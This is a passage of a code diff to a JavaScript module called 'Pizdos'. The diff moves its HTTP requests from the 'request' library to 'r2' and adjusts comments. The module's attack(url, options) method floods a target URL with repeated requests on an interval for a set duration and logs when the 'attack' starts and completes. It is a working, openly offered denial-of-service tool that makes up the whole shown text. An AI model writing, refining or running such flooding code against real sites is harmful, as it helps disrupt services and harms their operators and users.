@@ -1,35 +1,33 @@
-// ---------------------------- Imports. ---------------------------------
-const request = require('request')
+const r2 = require('r2')
 
-// --------------------------- Main class. -------------------------------
 module.exports = class Pizdos {
-    // Public.
     /**
      * Starts attack on url using options.
      * @param {string} url 
      * @param {object} options
+     * @returns {void}
      * @public
      */
     static attack(url, options) {
         options = Object.assign(this.standardOptions, options)
 
         options.log(`Attack started at ${new Date}.`)
-        
-        setInterval(() => {
-            request(url, error => {
-                if (error) throw 'Attack ended with an error.\n' + error
-            })
-        }, options.frequency)
-        
+
+        setInterval(() =>
+            r2(url).text
+            .catch(error => {
+                throw 'Attack ended with an error.\n' + error
+            }), options.frequency)
+
         setTimeout(() => {
             options.log(`Attack complete at ${new Date}.`)
             process.exit(0)
         }, options.duration)
     }
 
-    // Private.
     /**
      * Constant with standard options.
+     * @returns {object}
      * @private
      */
     static get standardOptions() {
